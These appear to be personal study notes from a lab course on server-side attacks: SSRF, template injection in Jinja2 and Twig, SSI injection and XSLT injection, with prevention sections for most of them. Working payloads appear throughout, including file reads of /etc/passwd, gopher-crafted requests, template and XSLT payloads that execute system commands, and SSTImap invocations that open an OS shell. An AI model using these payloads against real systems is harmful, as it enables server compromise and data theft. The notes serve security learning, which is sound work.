# Server-side Attacks

# Introduction to Server-side Attacks

Server-side attacks target the application or service provided by a **server**, whereas client-side attacks occur at the **client's machine**. These distinctions are critical for penetration testing and bug bounty hunting.

### Key Differences:

- **Client-side attacks**: Target the user's web browser (e.g., Cross-Site Scripting, XSS).
- **Server-side attacks**: Target the web server directly.

### Four Classes of Server-side Vulnerabilities:

1. **Server-Side Request Forgery (SSRF)**
2. **Server-Side Template Injection (SSTI)**
3. **Server-Side Includes (SSI) Injection**
4. **XSLT Server-Side Injection**

---

## [Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

- **Description**: Vulnerability allowing attackers to manipulate a web app to send unauthorized requests from the server.
- **Causes**: Often occurs when applications make HTTP requests to other servers based on user input.
- **Impact**:
    - Access internal systems.
    - Bypass firewalls.
    - Retrieve sensitive data.

---

## [Server-Side Template Injection (SSTI)](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)

- **Description**: Arises when attackers inject template code into web applications using server-side templating engines.
- **Causes**: Templating engines process user input to generate dynamic content like HTML responses.
- **Impact**:
    - Data leakage.
    - Server compromise via remote code execution.

---

## [Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)

- **Description**: Occurs when attackers inject commands into server-side include directives in HTML.
- **Causes**: SSI directives allow dynamic inclusion of additional content like headers or footers.
- **Impact**:
    - Data leakage.
    - Remote code execution.

---

## XSLT Server-Side Injection

- **Description**: Exploits weaknesses in XSLT (Extensible Stylesheet Language Transformations) handling.
- **Causes**: XSLT transforms XML documents into formats like HTML, and poor handling can allow attackers to inject code.
- **Impact**:
    - Arbitrary code execution on the server.

# [SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### Overview

- **SSRF vulnerabilities** are included in the **OWASP Top 10**.
- These vulnerabilities occur when a web application fetches additional resources from a remote location based on **user-supplied data**, such as a URL.

### How SSRF Works

- When a web server fetches remote resources based on user input, an attacker can coerce the server into making requests to arbitrary URLs.
- Depending on the web application's configuration, SSRF vulnerabilities can lead to **severe consequences**.

### Exploitation via URL Schemes

1. **`http:// and https://`**
    - Fetch content via HTTP/S requests.
    - Exploitation Examples:
        - Bypass Web Application Firewalls (**WAFs**).
        - Access restricted endpoints.
        - Interact with endpoints in the internal network.
2. **`file://`**
    - Reads a file from the local file system.
    - Exploitation Example:
        - Attackers can perform **Local File Inclusion (LFI)** to read sensitive files on the server.
3. **`gopher://`**
    - Sends arbitrary bytes to a specified address.
    - Exploitation Examples:
        - Craft HTTP POST requests with arbitrary payloads.
        - Communicate with services such as **SMTP servers** or **databases**.

## Identifying SSRF

### Enumeration

```bash
seq 1 10000 > ports.txt
```

Fuzzing:

```bash
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
<SNIP>
[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
---
ffuf 
-w ./ports.txt 
-u http://172.17.0.2/index.php 
-X POST 
-H "Content-Type: application/x-www-form-urlencoded" 
-d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" 
-fr "Failed to connect to"
```

## Exploiting SSRF

### Accessing Restricted Endpoints

As we have seen, the web application fetches availability information from the URL `dateserver.htb`. However, when we add this domain to our hosts file and attempt to access it, we are unable to do so:

![image.png](image%2072.png)

However, we can access and enumerate the domain through the SSRF vulnerability. For instance, we can conduct a directory brute-force attack to enumerate additional endpoints using `ffuf`. To do so, let us first determine the web server's response when we access a non-existing page:

![image.png](image%2073.png)

**`dateserver=http://dateserver.htb/invalid&date=2024-01-01`**

As we can see, the web server responds with the default Apache 404 response. To also filter out any HTTP 403 responses, we will filter our results based on the string `Server at dateserver.htb Port 80`, which is contained in default Apache error pages. Since the web application runs PHP, we will specify the `.php` extension:

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"

<SNIP>

[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```

We have successfully identified an additional internal endpoint that we can now access through the SSRF vulnerability by specifying the URL `http://dateserver.htb/admin.php` in the `dateserver` POST parameter to potentially access sensitive admin information.

### Local File Inclusion (LFI)

we can manipulate the URL scheme to provoke further unexpected behavior. Since the URL scheme is part of the URL supplied to the web application, let us attempt to read local files from the file system using the `file://` URL scheme. We can achieve this by supplying the URL `file:///etc/passwd`

![image.png](image%2074.png)

### Gopher Protocol

Overview

- The Gopher protocol allows sending arbitrary bytes to a TCP socket.
- Useful in exploiting SSRF vulnerabilities when HTTP's `GET` method is restrictive or insufficient.
- By crafting Gopher URLs, attackers can interact with internal services beyond HTTP, e.g., SMTP, MySQL.

As we have seen previously, we can use SSRF to access restricted internal endpoints. However, we are restricted to GET requests as there is no way to send a POST request with the `http://` URL scheme. For instance, let us consider a different version of the previous web application. Assuming we identified the internal endpoint `/admin.php` just like before, however, this time the response looks like this:

![image.png](image%2075.png)

As we can see, the admin endpoint is protected by a login prompt. From the HTML form, we can deduce that we need to send a POST request to `/admin.php` containing the password in the `adminpw` POST parameter. However, there is no way to send this POST request using the `http://` URL scheme.

Instead, we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.

- Manually construct the POST request:
    
    ```php
    POST /admin.php HTTP/1.1
    Host: dateserver.htb
    Content-Length: 13
    Content-Type: application/x-www-form-urlencoded
    
    adminpw=admin
    ```
    
- Encode the request to form a valid Gopher URL:
    
    ```bash
    gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
    ```
    
- Double-URL encode the Gopher URL when sending via an HTTP POST parameter:
    
    ```php
    POST /index.php HTTP/1.1
    Host: 172.17.0.2
    Content-Length: 265
    Content-Type: application/x-www-form-urlencoded
    
    dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
    ```
    

---

**Automating URL Construction with Gopherus**

- **Tool**: `Gopherus` automates creating Gopher URLs for various protocols.

```bash
python2.7 gopherus.py --exploit <service>
```

**Supported Services**:

- **`MySQL, PostgreSQL, FastCGI, Redis, SMTP, Zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache.`**

---

Example: Exploiting SMTP via Gopherus

```bash
python2.7 gopherus.py --exploit smtp
```

1. **Input Details**:
    - Mail from: `attacker@academy.htb`
    - Mail to: `victim@academy.htb`
    - Subject: `HelloWorld`
    - Message: `Hello from SSRF!`
2. **Generated Gopher URL**:
    
    ```
    gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.
    ```
    

---

Key Points

- **URL-Encoding**: Critical to ensure the constructed URL is syntactically valid.
- **Double-URL-Encoding**: Necessary when embedding a Gopher URL in an HTTP request.
- **Applications**: The Gopher protocol can target non-HTTP services (SMTP, MySQL, etc.).
- **Gopherus**: A powerful tool for simplifying Gopher URL creation.

## Blind SSRF

In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are called `blind` SSRF vulnerabilities because we cannot see the response. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors.

### Identifying Blind SSRF

 We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up a `netcat` listener:

```php
DarkSideDani@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

However, if we attempt to point the web application to itself, we can observe that the response does not contain the HTML response of the coerced request; instead, it simply lets us know that the date is unavailable. Therefore, this is a blind SSRF vulnerability:

![image.png](image%2076.png)

### Exploiting Blind SSRF

depending on the web application's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports. In this case, the web application responds with `Something went wrong!` for closed ports:

![image.png](image%2077.png)

However, if a port is open and responds with a valid HTTP response, we get a different error message:

![image.png](image%2078.png)

Depending on how the web application catches unexpected errors, we might be unable to identify running services that do not respond with valid HTTP responses. For instance, we are unable to identify the running MySQL service using this technique:

![image.png](image%2079.png)

Furthermore, while we cannot read local files like before, we can use the same technique to identify existing files on the filesystem. That is because the error message is different for existing and non-existing files, just like it differs for open and closed ports:

![image.png](image%2080.png)

For invalid files, the error message is different:

![image.png](image%2081.png)

## Preventing SSRF Vulnerabilities

SSRF prevention requires a combination of application-level and network-level defenses to effectively mitigate potential risks.

---

### Application-Level Prevention

1. **Whitelist Validation**:
    - Allow connections only to predefined, trusted origins.
    - Ensure the URL origin is validated against this whitelist.
    - Example:
        - Trusted domains: `api.trusted.com`, `data.safe.net`.
2. **Restrict Protocols**:
    - Limit the URL schemes/protocols that the application can use.
    - Block protocols like `gopher://`, `file://`, or `ftp://` unless explicitly required.
    - Example: Enforce `http://` and `https://` only.
3. **Input Sanitization**:
    - Sanitize and validate user-provided input to remove unexpected or malicious values.
    - Reject malformed URLs or inputs with ambiguous encoding.
4. **Hardcoding URLs**:
    - Use hardcoded URLs whenever possible to eliminate reliance on user input for remote requests.
    - Example: Directly embed API endpoints rather than accepting user-defined ones.

---

### Network-Level Mitigation

1. **Firewall Rules**:
    - Implement restrictive outbound firewall rules to limit the scope of external requests.
    - Block access to:
        - Internal IP ranges: `10.0.0.0/8`, `192.168.0.0/16`, etc.
        - Untrusted or non-public domains.
2. **Network Segmentation**:
    - Isolate internal systems from the public-facing application server.
    - Ensure that the application cannot directly access sensitive internal resources.

---

### Additional Measures

- **Monitoring and Logging**:
    - Monitor outgoing traffic for unusual patterns or attempts to access internal systems.
    - Log all outgoing requests to help detect exploitation attempts.
- **Testing and Patching**:
    - Conduct regular security assessments, including penetration testing, to identify potential SSRF vulnerabilities.
    - Stay updated with patches and security advisories for software dependencies.

---

References

- **OWASP SSRF Prevention Cheat Sheet**:
    - A comprehensive guide for SSRF mitigation techniques.
    - [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

# SSTI

## Template Engines

Template engines typically require two inputs: a template and a set of values to be inserted into the template. The template can typically be provided as a string or a file and contains pre-defined places where the template engine inserts the dynamically generated values. 

- A **template engine** generates dynamic responses by combining templates with data.
- Common use case: Sharing headers/footers across multiple web pages to reduce redundancy and maintain consistency.

**`Popular Template Engines`**

- [**Jinja**](https://jinja.palletsprojects.com/en/stable/): Python-based template engine.
- [**Twig**](https://twig.symfony.com): PHP-based template engine.

---

1. **Inputs**:
    - **Template**: Defines the structure of the output with placeholders for dynamic content.
    - **Values**: Key-value pairs to populate the placeholders in the template.
2. **Generating a string from the input template and input values is called rendering.**:
    - The process of combining a template and values to produce a final output string.

---

### Simple Placeholder Replacement

The template syntax depends on the concrete template engine used. For demonstration purposes, we will use the syntax used by the `Jinja` template engine throughout this section. Consider the following template string:

```
Hello {{ name }}!
```

- basically “name” is the variable and it will be rendered based on the value that it holds

Example 2: Using Loops

```
{% for name in names %}
Hello {{ name }}!
{% endfor %}
```

Rendering:

- Input value: `names=["vautia", "21y4d", "Pedant"]`

```bash
#Output:
Hello vautia!
Hello 21y4d!
Hello Pedant!
```

---

### **Capabilities of Modern Template Engines**

1. **Variables**:
    - Placeholders for dynamic content.
    - Example: `{{ variable_name }}`
2. **Conditions**:
    - Example:
        
        ```
        {% if is_logged_in %}
        Welcome back, {{ user }}!
        {% else %}
        Please log in.
        {% endif %}
        ```
        
3. **Loops**:
    - Iterate over lists or other iterable objects.
    - Example:
        
        ```json
        {% for item in items %}
        - {{ item }}
        {% endfor %}
        ```
        
4. **Custom Filters and Functions**:
    - Perform operations on variables or format them.
    - Example:
        
        ```
        {{ price | round(2) }}
        ```
        

---

**Key Advantages of Template Engines**

- **Code Maintainability**: Avoids redundancy (e.g., shared headers/footers).
- **Dynamic Content**: Facilitates easy integration of dynamic data into templates.
- **Separation of Concerns**: Decouples logic from presentation.

Definition

- **Server-Side Template Injection (SSTI)**: Occurs when attackers inject templating code into a template rendered by the server.
- **Impact**: Malicious code execution during rendering can allow attackers to compromise the server.

---

## Server-Side Template Injection Details

### Template Rendering

- Templates handle **dynamic values** during rendering, often provided by users.
- Template engines can securely handle user input **if the input is passed as values** to the rendering function.

### Secure vs. Vulnerable Usage

- **Secure Implementation**:
    - User input is passed as **values**, not injected into the template string.
- **Vulnerable Implementation**:
    - SSTI occurs if:
        1. User input is inserted directly into the template **before rendering**.
        2. The rendering function is applied **multiple times** on the same template, with user input treated as part of the template string.

### Scenarios Leading to SSTI

- **Direct Input Injection**: User input is added into the template string before rendering.
- **Multi-Stage Rendering**: Initial rendering output containing user input is reused as a new template string.
- **User-Modified Templates**: Applications allowing users to edit or submit templates create **clear SSTI vulnerabilities**.

## Identifying SSTI

- Identifying an SSTI vulnerability involves:
    - Confirming the presence of the vulnerability.
    - Determining the **template engine** used by the target application, as:
        - **Exploitation** methods depend on the specific template engine.
        - Syntax and supported functions vary across template engines.

### Confirming SSTI

### Process

- **Approach**:
    - Similar to identifying other injection vulnerabilities (e.g., SQL injection).
    - Inject **special characters** with semantic meaning in template engines.
    - Observe the application's behavior to detect errors.

```bash
${{<%[%'"}}%\\
```

- This string:
    - Contains special characters with **semantic significance** in popular template engines.
    - Will likely break the template's syntax and trigger an error in applications vulnerable to SSTI.

### Expected Behavior

- If the application is vulnerable:
    - The injected string will **violate the template syntax**.
    - This leads to an error message, confirming the vulnerability.

### Analogy with SQL Injection

- Similar to injecting a single quote (`'`) in SQL injection:
    - A malformed SQL query results in an SQL error.
    - Injecting special characters in SSTI produces syntax errors in the template engine.

Example:

![image.png](image%2082.png)

But if we inject the: `${{<%[%'"}}%\\`

![image.png](image%2083.png)

As we can see, the web application throws an error. While this does not confirm that the web application is vulnerable to SSTI, it should increase our suspicion that the parameter might be vulnerable.

## Identifying the Template Engine

We can utilize slight variations in the behavior of different template engines to achieve this. For instance, consider the following commonly used overview containing slight differences in popular template engines:

```bash
${7*7}
{{7*7}}
a{*comment*}b
${"z".join("ab")}
```

![image.png](image%2084.png)

We will start by injecting the payload `${7*7}` and follow the diagram from left to right, depending on the result of the injection. Suppose the injection resulted in a successful execution of the injected payload. In that case, we follow the green arrow; otherwise, we follow the red arrow until we arrive at a resulting template engine.

Injecting the payload `${7*7}` into our sample web application results in the following behavior:

![image.png](image%2085.png)

Since the injected payload was not executed, we follow the red arrow and now inject the payload `{{7*7}}`:

![image.png](image%2086.png)

This time, the payload was executed by the template engine. Therefore, we follow the green arrow and inject the payload `{{7*'7'}}`. The result will enable us to deduce the template engine used by the web application. In Jinja, the result will be `7777777`, while in Twig, the result will be `49`.

## Exploiting SSTI - Jinja2

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

https://hackmd.io/@Chivato/HyWsJ31dI

We will assume that we have successfully identified that the web application uses the `Jinja` template engine. We will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step.

Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. This section will focus on a `Flask` web application. The payloads in other web frameworks might thus be slightly different.

### Information Disclosure

We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. 

```bash
{{ config.items() }}
```

![image.png](image%2087.png)

Since this payload dumps the entire web application configuration, including any used secret keys, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

![image.png](image%2088.png)

### Local File Inclusion (LFI)

We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:

```python
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![image.png](image%2089.png)

### Remote Code Execution (RCE)

To achieve remote code execution in Python, we can use functions provided by the `os` library, such as `system` or `popen`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`. This results in the following SSTI payload:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
# so for example to read a file located in /flag.txt we do:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
# or for any other files
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /path/to/your/file.txt').read() }}
```

![image.png](image%2090.png)

## Exploiting SSTI - Twig

### Information Disclosure

In Twig, we can use the `_self` keyword to obtain a little information about the current template:

```python
{{ _self }}
```

![image.png](image%2091.png)

However, as we can see, the amount of information is limited compared to `Jinja`.

### Local File Inclusion (LFI)

Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:

```python
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

![image.png](image%2092.png)

### Remote Code Execution (RCE)

To achieve remote code execution, we can use a PHP built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:

```python
{{ ['id'] | filter('system') }}
{{ ['cat /flag.txt'] | filter('system') }}

# example: 
api=http://truckapi.htb/?id={{['cat${IFS}/flag.txt']|filter('system')}}
```

![image.png](image%2093.png)

## SSTI Tools of the Trade & Preventing SSTI

‣

```bash
DarkSideDani@htb[/htb]$ git clone https://github.com/vladko312/SSTImap
DarkSideDani@htb[/htb]$ cd SSTImap
DarkSideDani@htb[/htb]$ pip3 install -r requirements.txt
DarkSideDani@htb[/htb]$ python3 sstimap.py 

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗ ║ ║ ║{║ _ __ ___ __ _ _ __
    ╚════╗ ╠════╗ ║ ║ ║ ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║ ║ ║ ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝ ╚═╝ ╚╦╝ |_| |_| |_|\__,_| .__/
                             │ | |
                                                |_|
[*] Version: 1.2.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state, and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2
[*] Loaded request body types: 4
[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```

To automatically identify any SSTI vulnerabilities as well as the template engine used by the web application, we need to provide SSTImap with the target URL:

```bash
DarkSideDani@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

[+] File downloaded correctly
```

As we can see, SSTImap confirms the SSTI vulnerability and successfully identifies the `Twig` template engine. It also provides capabilities we can use during exploitation. For instance, we can download a remote file to our local machine using the `-D` flag:

```bash
DarkSideDani@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
[+] File downloaded correctly
```

## Identifying and Exploiting SSTI Vulnerabilities

- **SSTImap** is a modern tool used for identifying and exploiting SSTI vulnerabilities. It replaces the outdated `tplmap` tool and runs on Python3.
- Steps to set up and run SSTImap:
    
    ```bash
    git clone https://github.com/vladko312/SSTImap
    cd SSTImap
    pip3 install -r requirements.txt
    python3 sstimap.py
    ```
    

### Using SSTImap to Identify SSTI Vulnerabilities

- Run SSTImap with a target URL to identify vulnerabilities and template engines:
    
    ```bash
    python3 sstimap.py -u http://172.17.0.2/index.php?name=test
    ```
    
    - Example Output:
        
        ```
        [+] SSTImap identified the following injection point:
          Query parameter: name
          Engine: Twig
          Injection: *
          Context: text
          OS: Linux
          Technique: render
          Capabilities:
            Shell command execution: ok
            Bind and reverse shell: ok
            File write: ok
            File read: ok
            Code evaluation: ok, php code
        ```
        

### Exploiting SSTI Vulnerabilities

- **Download a Remote File:**
    
    ```bash
    python3 sstimap.py -u <http://172.17.0.2/index.php?name=test> -D '/etc/passwd' './passwd'
    ```
    
- **Execute a System Command:**
    
    ```bash
    python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
    ```
    
- **Obtain an Interactive Shell:**
    
    ```bash
    python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
    ```
    

## Preventing SSTI Vulnerabilities

1. **Avoid Feeding User Input into the Template Engine**:
    - Ensure user input is never passed to the template engine's rendering function.
    - Perform a thorough review of all code paths to block direct user input from being rendered.
2. **Hardening Template Engines**:
    - Remove dangerous functions from the execution environment to mitigate remote code execution.
    - Example: Restrict access to functions that execute arbitrary code or interact with the OS.
3. **Isolate Execution Environments**:
    - Use a separate execution environment, such as a Docker container, for the template engine. This ensures the web server remains unaffected by potential SSTI exploits.
4. **Secure Template Modifications**:
    - If users need to upload or modify templates, implement robust security measures to prevent exploitation.

By following these steps, web applications can be secured against SSTI vulnerabilities effectively.

# SSI Injection

## Overview

- **SSI** is a technology used by web applications to create dynamic content on HTML pages.
- Supported by popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude).
- **File Extensions**:
    - Common extensions: `.shtml`, `.shtm`, `.stm`.
    - Note: Web servers can be configured to support SSI directives in arbitrary file extensions, so we cannot conclusively conclude whether SSI is used only from the file extension.

## SSI Directives

SSI uses directives to add dynamic content to static HTML. Each directive consists of:

1. **`name`**: The directive's name.
2. **`parameter name`**: One or more parameters.
3. **`value`**: One or more parameter values.

### Syntax

```html
<!--#name param1="value1" param2="value2" -->
```

### Common SSI Directives

1. **printenv**
    - Prints environment variables.
    - Does not take any parameters.
    
    ```html
    <!--#printenv -->
    ```
    
2. **config**
    - Changes the SSI configuration using specific parameters.
    - Example: Change error message with `errmsg` parameter.
    
    ```html
    <!--#config errmsg="Error!" -->
    ```
    
3. **echo**
    - Prints the value of a specified variable using the `var` parameter.
    - Supported variables include:
        - **`DOCUMENT_NAME`**: Current file's name.
        - **`DOCUMENT_URI`**: Current file's URI.
        - **`LAST_MODIFIED`**: Timestamp of the last modification of the current file.
        - **`DATE_LOCAL`**: Local server time.
    - Example:
    
    ```html
    <!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
    ```
    
4. **exec**
    - Executes a command given in the **`cmd`** parameter.
    
    ```html
    <!--#exec cmd="whoami" -->
    ```
    
5. **include**
    - Includes a file specified in the **`virtual`** parameter.
    - Restriction: Only allows inclusion of files within the web root directory.
    
    ```html
    <!--#include virtual="index.html" -->
    ```
    

## SSI Injection

- **Definition**: Occurs when an attacker injects SSI directives into a file served by the web server, leading to the execution of malicious SSI directives.
- **Potential Attack Scenarios**:
    1. **File Upload Vulnerabilities**: Attacker uploads a file with malicious SSI directives into the web root directory.
    2. **User Input in Files**: Web application writes user input directly into a file in the web root directory, allowing for SSI directive injection.

## Preventing SSI Injection

Improper implementation of SSI can lead to critical vulnerabilities, including **remote code execution** and full web server takeover. To prevent SSI injection, web applications must implement the following security measures:

1. **Validate and Sanitize User Input**:
    - Ensure all user input is properly validated and sanitized, especially when it is:
        - Used within SSI directives.
        - Written to files that could contain SSI directives as per web server configuration.
2. **Restrict SSI Usage**:
    - Configure the web server to limit SSI usage to **specific file extensions** (e.g., `.shtml`, `.shtm`) and **particular directories**.
3. **Limit SSI Directive Capabilities**:
    - Disable unnecessary SSI directives to minimize the attack surface.
    - Example: Turn off the `exec` directive if it is not explicitly needed.

By applying these measures, developers can significantly reduce the risk of SSI injection vulnerabilities.

# XSLT Injection (eXtensible Stylesheet Language Transformation)

- **XSLT** is a language used for transforming XML documents.
- It allows selecting specific nodes from an XML document and altering its structure or generating other outputs.

**`Sample XML Document`**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

### Common XSL Elements

1. **`<xsl:template>`**: Defines a template applied to specific nodes.
    - Example: Match a node and process its children.
2. **`<xsl:value-of>`**: Extracts and outputs the value of an XML node.
3. **`<xsl:for-each>`**: Iterates over XML nodes specified in the **`select`**attribute

### Sample XSLT Document

This XSLT document outputs all fruits and their colors:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>">
    <xsl:template match="/fruits">
        Here are all the fruits:
        <xsl:for-each select="fruit">
            <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

**Output** (after combining XML and XSLT):

```xml
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```

### Additional XSL Elements

1. **`<xsl:sort>`**: Sorts elements in a loop.
2. **`<xsl:if>`**: Applies conditions for filtering nodes.

### Example: Sorting and Filtering

Output fruits of medium size, sorted by color in descending order:

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>">
    <xsl:template match="/fruits">
        Here are all fruits of medium size ordered by their color:
        <xsl:for-each select="fruit">
            <xsl:sort select="color" order="descending" />
            <xsl:if test="size = 'Medium'">
                <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
            </xsl:if>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

**Output**:

```
Here are all fruits of medium size ordered by their color:
    Banana (Yellow)
    Apple (Red)
```

## XSLT Injection

- **Definition**: XSLT injection occurs when user input is inserted into XSL data processed by the XSLT engine.
- This allows attackers to inject malicious XSL elements, which will be executed by the XSLT processor during output generation.

### Risks of XSLT Injection

1. Arbitrary code execution.
2. Unauthorized access to sensitive XML data.
3. Generating unintended or malicious outputs.

### Example Scenario

If user-controlled input is embedded directly into an XSLT transformation, an attacker could inject malicious XSL elements (e.g., `<xsl:value-of>` or `<xsl:template>`) to manipulate output or access restricted data.

## Exploiting XSLT Injection

![image.png](image%2094.png)

As we can see, the name we provide is reflected on the page. Suppose the web application stores the module information in an XML document and displays the data using XSLT processing. In that case, it might suffer from XSLT injection if our name is inserted without sanitization before XSLT processing. To confirm that, let us try to inject a broken XML tag to try to provoke an error in the web application. We can achieve this by providing the username `<:`

![image.png](image%2095.png)

As we can see, the web application responds with a server error. While this does not confirm that an XSLT injection vulnerability is present, it might indicate the presence of a security issue.

### Information Disclosure

We can try to infer some basic information about the XSLT processor in use by injecting the following XSLT elements:

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

The web application provides the following response:

![image.png](image%2096.png)

Since the web application interpreted the XSLT elements we provided, this confirms an XSLT injection vulnerability. Furthermore, we can deduce that the web application seems to rely on the `libxslt` library and supports XSLT version `1.0`.

### Local File Inclusion (LFI)

**Reading Files with `unparsed-text`**

- The `unparsed-text` function can be used to read local files in XSLT 2.0 and higher.
- Syntax:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

- **Note**: This function is only supported in **XSLT 2.0+**. If the XSLT processor does not support version 2.0, this will result in an error.

**Reading Files with PHP Functions**

- If the XSLT library is configured to support PHP functions, it is possible to call PHP functions directly.
- Example using the `file_get_contents` PHP function to read `/etc/passwd`:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

- This works only if:
    1. PHP support is enabled in the XSLT library.
    2. The function `file_get_contents` is accessible and allowed.

(This specific machine was configured to support `.php`)

![image.png](image%2097.png)

### Remote Code Execution (RCE)

If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function `system` to execute a command:

```xml
<xsl:value-of select="php:function('system','id')" />
```

![image.png](image%2098.png)

## Preventing XSLT Injection

